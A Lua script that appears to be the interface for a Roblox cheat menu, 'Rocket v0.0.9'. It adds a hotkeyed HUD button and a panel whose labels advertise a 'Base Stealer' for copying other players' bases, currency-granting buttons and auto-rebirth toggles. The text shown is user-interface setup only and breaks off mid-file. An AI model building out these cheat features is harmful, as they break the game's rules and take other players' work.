local version = "0.0.9"

if game.Players.LocalPlayer.PlayerGui.GUI.HUDLeft.Buttons:findFirstChild("Rocket") then
game.Players.LocalPlayer.PlayerGui.GUI.HUDLeft.Buttons.Rocket:remove()
end

local Rocket = Instance.new("ImageButton")
local FancyShadow = Instance.new("ImageLabel")
local Icon = Instance.new("ImageLabel")
local Hover = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Sub = Instance.new("TextLabel")
local Under = Instance.new("TextLabel")
local Pulse = Instance.new("ImageLabel")

Rocket.Name = "Rocket"
Rocket.Parent = game.Players.LocalPlayer.PlayerGui.GUI.HUDLeft.Buttons
Rocket.BackgroundColor3 = Color3.new(1, 1, 1)
Rocket.BackgroundTransparency = 1
Rocket.LayoutOrder = 4
Rocket.Size = UDim2.new(0, 50, 0, 50)
Rocket.ZIndex = 2
Rocket.Image = "rbxassetid://875052259"
Rocket.ImageColor3 = Color3.new(0.67, 0, 0)
Rocket.ScaleType = Enum.ScaleType.Slice
Rocket.SliceCenter = Rect.new(10, 10, 10, 10)

FancyShadow.Name = "FancyShadow"
FancyShadow.Parent = Rocket
FancyShadow.AnchorPoint = Vector2.new(0.5, 0.5)
FancyShadow.BackgroundColor3 = Color3.new(1, 1, 1)
FancyShadow.BackgroundTransparency = 1
FancyShadow.Position = UDim2.new(0.5, 0, 0.5, 4)
FancyShadow.Size = UDim2.new(1, 0, 1, 0)
FancyShadow.Image = "rbxassetid://875052259"
FancyShadow.ImageColor3 = Color3.new(0.403922, 0.403922, 0.403922)
FancyShadow.ImageTransparency = 0
FancyShadow.ScaleType = Enum.ScaleType.Slice
FancyShadow.SliceCenter = Rect.new(10, 10, 10, 10)

Icon.Name = "Icon"
Icon.Parent = Rocket
Icon.AnchorPoint = Vector2.new(0.5, 0.5)
Icon.BackgroundColor3 = Color3.new(1, 1, 1)
Icon.BackgroundTransparency = 1
Icon.Position = UDim2.new(0.5, 0, 0.5, 0)
Icon.Rotation = -45
Icon.Size = UDim2.new(0, 40, 0, 40)
Icon.ZIndex = 2
Icon.Image = "rbxassetid://2887383398"
Icon.ImageTransparency = 0.2

Hover.Name = "Hover"
Hover.Parent = Rocket
Hover.BackgroundColor3 = Color3.new(1, 1, 1)
Hover.BackgroundTransparency = 1
Hover.ClipsDescendants = true
Hover.Position = UDim2.new(1, 0, 0, 0)
Hover.Size = UDim2.new(0, 220, 1, 0)

Title.Name = "Title"
Title.Parent = Hover
Title.BackgroundColor3 = Color3.new(1, 1, 1)
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(-1, 0, 0, 0)
Title.Size = UDim2.new(0, 200, 0.7, 0)
Title.ZIndex = 4
Title.Font = Enum.Font.SourceSansBold
Title.FontSize = Enum.FontSize.Size14
Title.Text = "Rocket v" .. version
Title.TextColor3 = Color3.new(0.67, 0, 0)
Title.TextScaled = true
Title.TextSize = 14
Title.TextStrokeColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Title.TextStrokeTransparency = 0
Title.TextWrapped = true
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.TextYAlignment = Enum.TextYAlignment.Top

Under.Name = "Under"
Under.Parent = Title
Under.BackgroundColor3 = Color3.new(1, 1, 1)
Under.BackgroundTransparency = 1
Under.Position = UDim2.new(0, 0, 0, 3)
Under.Size = UDim2.new(1, 0, 1, 0)
Under.ZIndex = 3
Under.Font = Enum.Font.SourceSansBold
Under.FontSize = Enum.FontSize.Size14
Under.Text = "Rocket v" .. version
Under.TextColor3 = Color3.new(0.196078, 0, 0)
Under.TextScaled = true
Under.TextSize = 14
Under.TextStrokeColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Under.TextStrokeTransparency = 0
Under.TextWrapped = true
Under.TextXAlignment = Enum.TextXAlignment.Left
Under.TextYAlignment = Enum.TextYAlignment.Top

Sub.Name = "Sub"
Sub.Parent = Title
Sub.BackgroundColor3 = Color3.new(0, 0, 0)
Sub.BackgroundTransparency = 0.6
Sub.BorderSizePixel = 0
Sub.Position = UDim2.new(0, 0, 0.95, 0)
Sub.Size = UDim2.new(0.37, 0, 0.45, 0)
Sub.ZIndex = 4
Sub.Font = Enum.Font.SourceSansBold
Sub.FontSize = Enum.FontSize.Size14
Sub.Text = "Hotkey: [X]"
Sub.TextColor3 = Color3.new(0.941177, 0.941177, 0.941177)
Sub.TextScaled = true
Sub.TextSize = 14
Sub.TextStrokeTransparency = 0
Sub.TextWrapped = true
Sub.TextXAlignment = Enum.TextXAlignment.Left
Sub.TextYAlignment = Enum.TextYAlignment.Top

Pulse.Name = "Pulse"
Pulse.Parent = Rocket
Pulse.AnchorPoint = Vector2.new(0.5, 0.5)
Pulse.BackgroundColor3 = Color3.new(1, 1, 1)
Pulse.BackgroundTransparency = 1
Pulse.Position = UDim2.new(0.5, 0, 0.5, 0)
Pulse.Size = UDim2.new(2, 0, 2, 0)
Pulse.Visible = false
Pulse.Image = "rbxassetid://875052259"
Pulse.ImageColor3 = Color3.new(0.666667, 0, 0)
Pulse.ImageTransparency = 1
Pulse.ScaleType = Enum.ScaleType.Slice
Pulse.SliceCenter = Rect.new(10, 10, 10, 10)

function Tween(Object, Properties, Value, Time, Style, Direction)
	Style = Style or Enum.EasingStyle.Quad
	Direction = Direction or Enum.EasingDirection.Out
	Time = Time or 0.5
	local propertyGoals = {}
	local Table = type(Value) == "table" and true or false
	for i, Property in pairs(Properties) do
		propertyGoals[Property] = Table and Value[i] or Value
	end
	local tweenInfo = TweenInfo.new(Time, Style, Direction)
	local tween = game:GetService("TweenService"):Create(Object, tweenInfo, propertyGoals)
	tween:Play()
end

local Button = game.Players.LocalPlayer.PlayerGui.GUI.HUDLeft.Buttons.Rocket
local function close(Button)
  local Goal = UDim2.new(-1, 0, 0, 0)
  if Button.Hover.Active then
    Button.Hover.Active = false
    if Button.Hover:FindFirstChild("Title") and Button.Hover.Title.Position ~= Goal then
      Tween(Button.Hover.Title, {"Position"}, Goal, 1, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
    end
  elseif Button.Hover.Title.Position ~= Goal then
    Tween(Button.Hover.Title, {"Position"}, Goal, 1, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
  end
end
local function open(Button)
  if not Button.Hover.Active then
    Button.Hover.Active = true
    local Goal = UDim2.new(0, 10, 0, 0)
    if Button.Hover:FindFirstChild("Title") and Button.Hover.Title.Position ~= Goal then
      Tween(Button.Hover.Title, {"Position"}, Goal, 1, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
    end
  end
end
Button.Pulse.Size = UDim2.new(1, 0, 1, 0)
Button.Pulse.ImageTransparency = 0
Button.Pulse.Visible = true
Tween(Button.Pulse, {
  "ImageTransparency",
  "Size"
}, {
1,
UDim2.new(2, 0, 2, 0)
}, 0.3)
wait(0.3)
Button.Pulse.Visible = false

Button.MouseEnter:connect(function()
open(Button)
Button.Pulse.Size = UDim2.new(1, 0, 1, 0)
Button.Pulse.ImageTransparency = 0
Button.Pulse.Visible = true
Tween(Button.Pulse, {
"ImageTransparency",
"Size"
}, {
1,
UDim2.new(2, 0, 2, 0)
}, 0.3)
wait(0.3)
end)

Button.MouseLeave:connect(function()
close(Button)
end)

open(Button)
wait(2)
close(Button)


Button.MouseButton1Down:connect(function()
if game.Players.LocalPlayer.PlayerGui:findFirstChild("RocketHolder") then
if game.Players.LocalPlayer.PlayerGui.RocketHolder.Rocket.Visible == true then
game.Players.LocalPlayer.PlayerGui.GUI.Menu.Menu.Sounds.Click:Play()
game.Players.LocalPlayer.PlayerGui.RocketHolder.Rocket.Visible = false
if game.Lighting.Blur.Size == 9 then
for i=1,18 do
game.Lighting.Blur.Size = game.Lighting.Blur.Size-0.5
wait()
end
end
else
game.Players.LocalPlayer.PlayerGui.GUI.Menu.Menu.Sounds.Click:Play()
game.Players.LocalPlayer.PlayerGui.GUI.Settings.Visible = false
game.Players.LocalPlayer.PlayerGui.GUI.Premium.Visible = false
game.Players.LocalPlayer.PlayerGui.GUI.Shop.Visible = false
game.Players.LocalPlayer.PlayerGui.GUI.Inventory.Visible = false
game.Players.LocalPlayer.PlayerGui.RocketHolder.Rocket.Visible = true
if game.Lighting.Blur.Size == 0 then
for i=1,18 do
game.Lighting.Blur.Size = game.Lighting.Blur.Size+0.5
wait()
end
end
end
end
end)

spawn(function()
local player=game.Players.LocalPlayer
local uis=game:GetService("UserInputService")
uis.InputBegan:connect(function(key)
pcall(function()
if key.KeyCode==Enum.KeyCode.X then
if game.Players.LocalPlayer.PlayerGui:findFirstChild("RocketHolder") then
if game.Players.LocalPlayer.PlayerGui.RocketHolder.Rocket.Visible == true then
game.Players.LocalPlayer.PlayerGui.RocketHolder.Rocket.Visible = false
if game.Lighting.Blur.Size == 9 then
for i=1,18 do
game.Lighting.Blur.Size = game.Lighting.Blur.Size-0.5
wait()
end
end
else
game.Players.LocalPlayer.PlayerGui.GUI.Settings.Visible = false
game.Players.LocalPlayer.PlayerGui.GUI.Premium.Visible = false
game.Players.LocalPlayer.PlayerGui.GUI.Shop.Visible = false
game.Players.LocalPlayer.PlayerGui.GUI.Inventory.Visible = false
game.Players.LocalPlayer.PlayerGui.RocketHolder.Rocket.Visible = true
if game.Lighting.Blur.Size == 0 then
for i=1,18 do
game.Lighting.Blur.Size = game.Lighting.Blur.Size+0.5
wait()
end
end
end
end
end
end)
end)
end)

spawn(function()
if game.Players.LocalPlayer.PlayerGui:findFirstChild("RocketHolder") then
game.Players.LocalPlayer.PlayerGui.RocketHolder:remove()
end

local RocketHolder = Instance.new("ScreenGui")
local Rocket = Instance.new("ImageLabel")
local Contents = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")
local UIPadding = Instance.new("UIPadding")
local DefaultButtons = Instance.new("ImageLabel")
local DefaultContents = Instance.new("Frame")
local Button1 = Instance.new("TextButton")
local Fold = Instance.new("ImageLabel")
local Button2 = Instance.new("TextButton")
local Fold_2 = Instance.new("ImageLabel")
local UIListLayout_2 = Instance.new("UIListLayout")
local DefaultToggle = Instance.new("ImageLabel")
local DefaultContents_2 = Instance.new("Frame")
local DefaultToggle_2 = Instance.new("TextButton")
local DefaultOn = Instance.new("Frame")
local Deco = Instance.new("TextLabel")
local Deco_2 = Instance.new("ImageLabel")
local DefaultOff = Instance.new("Frame")
local Deco_3 = Instance.new("TextLabel")
local Deco_4 = Instance.new("ImageLabel")
local Deco_5 = Instance.new("TextLabel")
local Deco_6 = Instance.new("TextLabel")
local BaseStealer = Instance.new("ImageLabel")
local BaseStealerContents = Instance.new("Frame")
local Deco_7 = Instance.new("TextLabel")
local Deco_8 = Instance.new("TextLabel")
local BaseStealerButtons = Instance.new("Frame")
local UIListLayout_3 = Instance.new("UIListLayout")
local AutoRebirth = Instance.new("ImageLabel")
local AutoRebirthContents = Instance.new("Frame")
local AutoRebirthToggle = Instance.new("TextButton")
local AutoRebirthOn = Instance.new("Frame")
local Deco_9 = Instance.new("TextLabel")
local Deco_10 = Instance.new("ImageLabel")
local AutoRebirthOff = Instance.new("Frame")
local Deco_11 = Instance.new("TextLabel")
local Deco_12 = Instance.new("ImageLabel")
local Deco_13 = Instance.new("TextLabel")
local Deco_14 = Instance.new("TextLabel")
local AutoRemote = Instance.new("ImageLabel")
local AutoRemoteContents = Instance.new("Frame")
local AutoRemoteToggle = Instance.new("TextButton")
local AutoRemoteOn = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Fold_3 = Instance.new("ImageLabel")
local AutoRemoteOff = Instance.new("Frame")
local Title_2 = Instance.new("TextLabel")
local Fold_4 = Instance.new("ImageLabel")
local Deco_15 = Instance.new("TextLabel")
local Deco_16 = Instance.new("TextLabel")
local CloversTwitchCoins = Instance.new("ImageLabel")
local CloversTwitchCoinsContents = Instance.new("Frame")
local AddCloverButton = Instance.new("TextButton")
local Deco_17 = Instance.new("ImageLabel")
local AddTwitchCoinButton = Instance.new("TextButton")
local Deco_18 = Instance.new("ImageLabel")
local UIListLayout_4 = Instance.new("UIListLayout")
local Notifications = Instance.new("ImageLabel")
local NotificationsContents = Instance.new("Frame")
local NotificationsToggle = Instance.new("TextButton")
local NotificationsOn = Instance.new("Frame")
local Deco_19 = Instance.new("TextLabel")
local Deco_20 = Instance.new("ImageLabel")
local NotificationsOff = Instance.new("Frame")
local Deco_21 = Instance.new("TextLabel")
local Deco_22 = Instance.new("ImageLabel")
local Deco_23 = Instance.new("TextLabel")
local Deco_24 = Instance.new("TextLabel")
local AutoButton = Instance.new("ImageLabel")
local AutoButtonContents = Instance.new("Frame")
local AutoButtonToggle = Instance.new("TextButton")
local AutoButtonOn = Instance.new("Frame")
local Title_3 = Instance.new("TextLabel")
local Fold_5 = Instance.new("ImageLabel")
local AutoButtonOff = Instance.new("Frame")
local Title_4 = Instance.new("TextLabel")
local Fold_6 = Instance.new("ImageLabel")
local Deco_25 = Instance.new("TextLabel")
local Deco_26 = Instance.new("TextLabel")
local AutoLoadout = Instance.new("ImageLabel")
local AutoLoadoutContents = Instance.new("Frame")
local AutoLoadout1Toggle = Instance.new("TextButton")
local AutoLoadout1On = Instance.new("Frame")
local Deco_27 = Instance.new("TextLabel")
local Deco_28 = Instance.new("ImageLabel")
local AutoLoadout1Off = Instance.new("Frame")
local Deco_29 = Instance.new("TextLabel")
local Deco_30 = Instance.new("ImageLabel")
local Deco_31 = Instance.new("TextLabel")
local Deco_32 = Instance.new("TextLabel")
local Deco_33 = Instance.new("TextLabel")
local AutoLoadout2Toggle = Instance.new("TextButton")
local AutoLoadout2On = Instance.new("Frame")
local Deco_34 = Instance.new("TextLabel")
local Deco_35 = Instance.new("ImageLabel")
local AutoLoadout2Off = Instance.new("Frame")
local Deco_36 = Instance.new("TextLabel")
local Deco_37 = Instance.new("ImageLabel")
local AutoLoadout3Toggle = Instance.new("TextButton")
local AutoLoadout3On = Instance.new("Frame")
local Deco_38 = Instance.new("TextLabel")
local Deco_39 = Instance.new("ImageLabel")
local AutoLoadout3Off = Instance.new("Frame")
local Deco_40 = Instance.new("TextLabel")
local Deco_41 = Instance.new("ImageLabel")
local Deco_42 = Instance.new("TextLabel")
local OreBooster = Instance.new("ImageLabel")
local OreBoosterContents = Instance.new("Frame")
local OreBoosterButton = Instance.new("TextButton")
local Deco_43 = Instance.new("ImageLabel")
local Deco_44 = Instance.new("TextLabel")
local Top = Instance.new("ImageLabel")
local Title_5 = Instance.new("TextLabel")
local Close = Instance.new("TextButton")
local Depth = Instance.new("ImageLabel")
local Depth_2 = Instance.new("ImageLabel")
local UISizeConstraint = Instance.new("UISizeConstraint")
--Properties:
RocketHolder.Name = "RocketHolder"
RocketHolder.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
RocketHolder.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Rocket.Name = "Rocket"
Rocket.Parent = RocketHolder
Rocket.AnchorPoint = Vector2.new(0.5, 0.5)
Rocket.BackgroundColor3 = Color3.new(1, 1, 1)
Rocket.BackgroundTransparency = 1
Rocket.Position = UDim2.new(0.5, 0, 0.5, 0)
Rocket.Size = UDim2.new(0.600000024, 0, 0.800000012, 0)
Rocket.ZIndex = 5
Rocket.Image = "rbxassetid://875052259"
Rocket.ImageColor3 = Color3.new(0.294118, 0.294118, 0.294118)
Rocket.ScaleType = Enum.ScaleType.Slice
Rocket.SliceCenter = Rect.new(10, 10, 10, 10)
Rocket.Visible = false

Contents.Name = "Contents"
Contents.Parent = Rocket
Contents.BackgroundColor3 = Color3.new(0.0705882, 0.0705882, 0.0705882)
Contents.BackgroundTransparency = 1
Contents.BorderSizePixel = 0
Contents.Position = UDim2.new(0, 0, 0, 7)
Contents.Selectable = false
Contents.Size = UDim2.new(1, 0, 1, -14)
Contents.ZIndex = 5
Contents.CanvasSize = UDim2.new(0, 0, 0, 800)

UIListLayout.Parent = Contents
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0.00999999978, 0)

UIPadding.Parent = Contents

DefaultButtons.Name = "DefaultButtons"
DefaultButtons.Parent = Contents
DefaultButtons.BackgroundColor3 = Color3.new(1, 1, 1)
DefaultButtons.BackgroundTransparency = 1
DefaultButtons.LayoutOrder = 1
DefaultButtons.Size = UDim2.new(1, -20, 0, 40)
DefaultButtons.Visible = false
DefaultButtons.ZIndex = 5
DefaultButtons.Image = "rbxassetid://875052259"
DefaultButtons.ImageColor3 = Color3.new(0.227451, 0.227451, 0.227451)
DefaultButtons.ScaleType = Enum.ScaleType.Slice
DefaultButtons.SliceCenter = Rect.new(10, 10, 10, 10)

DefaultContents.Name = "DefaultContents"
DefaultContents.Parent = DefaultButtons
DefaultContents.BackgroundColor3 = Color3.new(1, 1, 1)
DefaultContents.BackgroundTransparency = 1
DefaultContents.BorderSizePixel = 0
DefaultContents.Size = UDim2.new(1, 0, 0, 40)
DefaultContents.ZIndex = 5

Button1.Name = "Button1"
Button1.Parent = DefaultContents
Button1.AnchorPoint = Vector2.new(0, 0.5)
Button1.BackgroundColor3 = Color3.new(0.839216, 0.254902, 0.266667)
Button1.BorderSizePixel = 0
Button1.Position = UDim2.new(0.0500000007, 0, 0.5, 0)
Button1.Size = UDim2.new(0.400000006, 0, 0, 30)
Button1.ZIndex = 5
Button1.Font = Enum.Font.ArialBold
Button1.Text = "Button 1"
Button1.TextScaled = true
Button1.TextSize = 40
Button1.TextWrapped = true

Fold.Name = "Fold"
Fold.Parent = Button1
Fold.AnchorPoint = Vector2.new(1, 0)
Fold.BackgroundColor3 = Color3.new(1, 1, 1)
Fold.BackgroundTransparency = 1
Fold.Position = UDim2.new(1, 0, 0, 0)
Fold.Size = UDim2.new(1, 0, 1, 0)
Fold.SizeConstraint = Enum.SizeConstraint.RelativeYY
Fold.ZIndex = 5
Fold.Image = "rbxassetid://1042585012"
Fold.ImageTransparency = 0.30000001192093

Button2.Name = "Button2"
Button2.Parent = DefaultContents
Button2.AnchorPoint = Vector2.new(0, 0.5)
Button2.BackgroundColor3 = Color3.new(1, 0.537255, 0.270588)
Button2.BorderSizePixel = 0
Button2.Position = UDim2.new(0.449999988, 0, 0.5, 0)
Button2.Size = UDim2.new(0.400000006, 0, 0, 30)
Button2.ZIndex = 5
Button2.Font = Enum.Font.ArialBold
Button2.Text = "Button 2"
Button2.TextScaled = true
Button2.TextSize = 40
Button2.TextWrapped = true

Fold_2.Name = "Fold"
Fold_2.Parent = Button2
Fold_2.AnchorPoint = Vector2.new(1, 0)
Fold_2.BackgroundColor3 = Color3.new(1, 1, 1)
Fold_2.BackgroundTransparency = 1
Fold_2.Position = UDim2.new(1, 0, 0, 0)
Fold_2.Size = UDim2.new(1, 0, 1, 0)
Fold_2.SizeConstraint = Enum.SizeConstraint.RelativeYY
Fold_2.ZIndex = 5
Fold_2.Image = "rbxassetid://1042585012"
Fold_2.ImageTransparency = 0.30000001192093

UIListLayout_2.Parent = DefaultContents
UIListLayout_2.FillDirection = Enum.FillDirection.Horizontal
UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout_2.VerticalAlignment = Enum.VerticalAlignment.Center

DefaultToggle.Name = "DefaultToggle"
DefaultToggle.Parent = Contents
DefaultToggle.BackgroundColor3 = Color3.new(1, 1, 1)
DefaultToggle.BackgroundTransparency = 1
DefaultToggle.LayoutOrder = 1
DefaultToggle.Size = UDim2.new(1, -20, 0, 60)
DefaultToggle.Visible = false
DefaultToggle.ZIndex = 5
DefaultToggle.Image = "rbxassetid://875052259"
DefaultToggle.ImageColor3 = Color3.new(0.305882, 0.458824, 0.639216)
DefaultToggle.ScaleType = Enum.ScaleType.Slice
DefaultToggle.SliceCenter = Rect.new(10, 10, 10, 10)

DefaultContents_2.Name = "DefaultContents"
DefaultContents_2.Parent = DefaultToggle
DefaultContents_2.BackgroundColor3 = Color3.new(1, 1, 1)
DefaultContents_2.BackgroundTransparency = 1
DefaultContents_2.BorderSizePixel = 0
DefaultContents_2.Size = UDim2.new(1, 0, 0, 40)
DefaultContents_2.ZIndex = 5

DefaultToggle_2.Name = "DefaultToggle"
DefaultToggle_2.Parent = DefaultContents_2
DefaultToggle_2.AnchorPoint = Vector2.new(0, 0.5)
DefaultToggle_2.BackgroundColor3 = Color3.new(0.741176, 0.741176, 0.741176)
DefaultToggle_2.BorderSizePixel = 0
DefaultToggle_2.Position = UDim2.new(0.550000012, 0, 0.5, 0)
DefaultToggle_2.Size = UDim2.new(0.400000006, 0, 0, 30)
DefaultToggle_2.ZIndex = 5
DefaultToggle_2.Font = Enum.Font.ArialBold
DefaultToggle_2.Text = ""
DefaultToggle_2.TextScaled = true
DefaultToggle_2.TextSize = 40
DefaultToggle_2.TextWrapped = true

DefaultOn.Name = "DefaultOn"
DefaultOn.Parent = DefaultToggle_2
DefaultOn.BackgroundColor3 = Color3.new(0, 0.796079, 0)
DefaultOn.BorderSizePixel = 0
DefaultOn.Size = UDim2.new(0.400000006, 0, 1, 0)
DefaultOn.ZIndex = 5

Deco.Name = "Deco"
Deco.Parent = DefaultOn
Deco.AnchorPoint = Vector2.new(0, 0.5)
Deco.BackgroundColor3 = Color3.new(1, 1, 1)
Deco.BackgroundTransparency = 1
Deco.Position = UDim2.new(0, 0, 0.5, 0)
Deco.Size = UDim2.new(1, 0, 1, 0)
Deco.ZIndex = 5
Deco.Font = Enum.Font.ArialBold
Deco.Text = "ON"
Deco.TextScaled = true
Deco.TextSize = 14
Deco.TextWrapped = true
Deco.TextXAlignment = Enum.TextXAlignment.Left

Deco_2.Name = "Deco"
Deco_2.Parent = DefaultOn
Deco_2.AnchorPoint = Vector2.new(1, 0)
Deco_2.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_2.BackgroundTransparency = 1
Deco_2.Position = UDim2.new(1, 0, 0, 0)
Deco_2.Size = UDim2.new(1, 0, 1, 0)
Deco_2.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco_2.ZIndex = 5
Deco_2.Image = "rbxassetid://1042585012"
Deco_2.ImageTransparency = 0.5

DefaultOff.Name = "DefaultOff"
DefaultOff.Parent = DefaultToggle_2
DefaultOff.AnchorPoint = Vector2.new(1, 0)
DefaultOff.BackgroundColor3 = Color3.new(0.796079, 0, 0.0156863)
DefaultOff.BorderSizePixel = 0
DefaultOff.Position = UDim2.new(1, 0, 0, 0)
DefaultOff.Size = UDim2.new(0.400000006, 0, 1, 0)
DefaultOff.Visible = false
DefaultOff.ZIndex = 5

Deco_3.Name = "Deco"
Deco_3.Parent = DefaultOff
Deco_3.AnchorPoint = Vector2.new(0, 0.5)
Deco_3.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_3.BackgroundTransparency = 1
Deco_3.Position = UDim2.new(0, 0, 0.5, 0)
Deco_3.Size = UDim2.new(1, 0, 1, 0)
Deco_3.ZIndex = 5
Deco_3.Font = Enum.Font.ArialBold
Deco_3.Text = "OFF"
Deco_3.TextScaled = true
Deco_3.TextSize = 14
Deco_3.TextWrapped = true
Deco_3.TextXAlignment = Enum.TextXAlignment.Right

Deco_4.Name = "Deco"
Deco_4.Parent = DefaultOff
Deco_4.AnchorPoint = Vector2.new(1, 0)
Deco_4.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_4.BackgroundTransparency = 1
Deco_4.Position = UDim2.new(1, 0, 0, 0)
Deco_4.Size = UDim2.new(1, 0, 1, 0)
Deco_4.SizeConstraint = Enum.SizeConstraint.RelativeYY
Deco_4.ZIndex = 5
Deco_4.Image = "rbxassetid://1042585012"
Deco_4.ImageTransparency = 0.5

Deco_5.Name = "Deco"
Deco_5.Parent = DefaultContents_2
Deco_5.AnchorPoint = Vector2.new(0, 0.5)
Deco_5.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_5.BackgroundTransparency = 1
Deco_5.Position = UDim2.new(0, 0, 0.5, 0)
Deco_5.Size = UDim2.new(0.5, 0, 0.699999988, 0)
Deco_5.ZIndex = 5
Deco_5.Font = Enum.Font.ArialBold
Deco_5.Text = "Toggle:"
Deco_5.TextScaled = true
Deco_5.TextSize = 14
Deco_5.TextWrapped = true
Deco_5.TextXAlignment = Enum.TextXAlignment.Left

Deco_6.Name = "Deco"
Deco_6.Parent = DefaultToggle
Deco_6.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_6.BackgroundTransparency = 1
Deco_6.Position = UDim2.new(0, 0, 1, -20)
Deco_6.Size = UDim2.new(1, 0, 0, 20)
Deco_6.ZIndex = 5
Deco_6.Font = Enum.Font.Arial
Deco_6.Text = "Some hint text."
Deco_6.TextColor3 = Color3.new(0, 0, 0)
Deco_6.TextScaled = true
Deco_6.TextSize = 14
Deco_6.TextTransparency = 0.69999998807907
Deco_6.TextWrapped = true

BaseStealer.Name = "BaseStealer"
BaseStealer.Parent = Contents
BaseStealer.BackgroundColor3 = Color3.new(1, 1, 1)
BaseStealer.BackgroundTransparency = 1
BaseStealer.LayoutOrder = 8
BaseStealer.Size = UDim2.new(1, -20, 0, 240)
BaseStealer.ZIndex = 5
BaseStealer.Image = "rbxassetid://875052259"
BaseStealer.ImageColor3 = Color3.new(0.498039, 0.301961, 0.639216)
BaseStealer.ScaleType = Enum.ScaleType.Slice
BaseStealer.SliceCenter = Rect.new(10, 10, 10, 10)

BaseStealerContents.Name = "BaseStealerContents"
BaseStealerContents.Parent = BaseStealer
BaseStealerContents.BackgroundColor3 = Color3.new(1, 1, 1)
BaseStealerContents.BackgroundTransparency = 1
BaseStealerContents.BorderSizePixel = 0
BaseStealerContents.Size = UDim2.new(1, 0, 0, 40)
BaseStealerContents.ZIndex = 5

Deco_7.Name = "Deco"
Deco_7.Parent = BaseStealerContents
Deco_7.AnchorPoint = Vector2.new(0, 0.5)
Deco_7.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_7.BackgroundTransparency = 1
Deco_7.Position = UDim2.new(0, 0, 0.5, 0)
Deco_7.Size = UDim2.new(0.5, 0, 0.699999988, 0)
Deco_7.ZIndex = 5
Deco_7.Font = Enum.Font.ArialBold
Deco_7.Text = "Base Stealer:"
Deco_7.TextScaled = true
Deco_7.TextSize = 14
Deco_7.TextWrapped = true
Deco_7.TextXAlignment = Enum.TextXAlignment.Left

Deco_8.Name = "Deco"
Deco_8.Parent = BaseStealer
Deco_8.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_8.BackgroundTransparency = 1
Deco_8.Position = UDim2.new(0, 0, 1, -20)
Deco_8.Size = UDim2.new(1, 0, 0, 20)
Deco_8.ZIndex = 5
Deco_8.Font = Enum.Font.Arial
Deco_8.Text = "Steal a players base and load it onto yours."
Deco_8.TextColor3 = Color3.new(0, 0, 0)
Deco_8.TextScaled = true
Deco_8.TextSize = 14
Deco_8.TextTransparency = 0.69999998807907
Deco_8.TextWrapped = true

BaseStealerButtons.Name = "BaseStealerButtons"
BaseStealerButtons.Parent = BaseStealer
BaseStealerButtons.BackgroundColor3 = Color3.new(1, 1, 1)
BaseStealerButtons.BackgroundTransparency = 1
BaseStealerButtons.BorderSizePixel = 0
BaseStealerButtons.Position = UDim2.new(0, 0, 0, 40)
BaseStealerButtons.Size = UDim2.new(1, 0, 0, 140)
BaseStealerButtons.ZIndex = 5

UIListLayout_3.Parent = BaseStealerButtons
UIListLayout_3.HorizontalAlignment = Enum.HorizontalAlignment.Center

AutoRebirth.Name = "AutoRebirth"
AutoRebirth.Parent = Contents
AutoRebirth.BackgroundColor3 = Color3.new(1, 1, 1)
AutoRebirth.BackgroundTransparency = 1
AutoRebirth.LayoutOrder = 1
AutoRebirth.Size = UDim2.new(1, -20, 0, 60)
AutoRebirth.ZIndex = 5
AutoRebirth.Image = "rbxassetid://875052259"
AutoRebirth.ImageColor3 = Color3.new(0.639216, 0.505882, 0.278431)
AutoRebirth.ScaleType = Enum.ScaleType.Slice
AutoRebirth.SliceCenter = Rect.new(10, 10, 10, 10)

AutoRebirthContents.Name = "AutoRebirthContents"
AutoRebirthContents.Parent = AutoRebirth
AutoRebirthContents.BackgroundColor3 = Color3.new(1, 1, 1)
AutoRebirthContents.BackgroundTransparency = 1
AutoRebirthContents.BorderSizePixel = 0
AutoRebirthContents.Size = UDim2.new(1, 0, 0, 40)
AutoRebirthContents.ZIndex = 5

AutoRebirthToggle.Name = "AutoRebirthToggle"
AutoRebirthToggle.Parent = AutoRebirthContents
AutoRebirthToggle.AnchorPoint = Vector2.new(0, 0.5)
AutoRebirthToggle.BackgroundColor3 = Color3.new(0.741176, 0.741176, 0.741176)
AutoRebirthToggle.BorderSizePixel = 0
AutoRebirthToggle.Position = UDim2.new(0.550000012, 0, 0.5, 0)
AutoRebirthToggle.Size = UDim2.new(0.400000006, 0, 0, 30)
AutoRebirthToggle.ZIndex = 5
AutoRebirthToggle.Font = Enum.Font.ArialBold
AutoRebirthToggle.Text = ""
AutoRebirthToggle.TextScaled = true
AutoRebirthToggle.TextSize = 40
AutoRebirthToggle.TextWrapped = true

AutoRebirthOn.Name = "AutoRebirthOn"
AutoRebirthOn.Parent = AutoRebirthToggle
AutoRebirthOn.BackgroundColor3 = Color3.new(0, 0.796079, 0)
AutoRebirthOn.BorderSizePixel = 0
AutoRebirthOn.Size = UDim2.new(0.400000006, 0, 1, 0)
AutoRebirthOn.Visible = false
AutoRebirthOn.ZIndex = 5

Deco_9.Name = "Deco"
Deco_9.Parent = AutoRebirthOn
Deco_9.AnchorPoint = Vector2.new(0, 0.5)
Deco_9.BackgroundColor3 = Color3.new(1, 1, 1)
Deco_9.BackgroundTransparency = 1
Deco_9.Position = UDim2.new(0, 0, 0.5, 0)
Deco_9.Size = UDim2.new(1, 0, 1, 0)
Deco_9.ZIndex = 5
Deco_9.Font = Enum.Font.ArialBold
Deco_9.Text = "ON"
Deco_9.TextScaled = true
Deco_9.TextSize = 14
Deco_9.TextWrapped = true
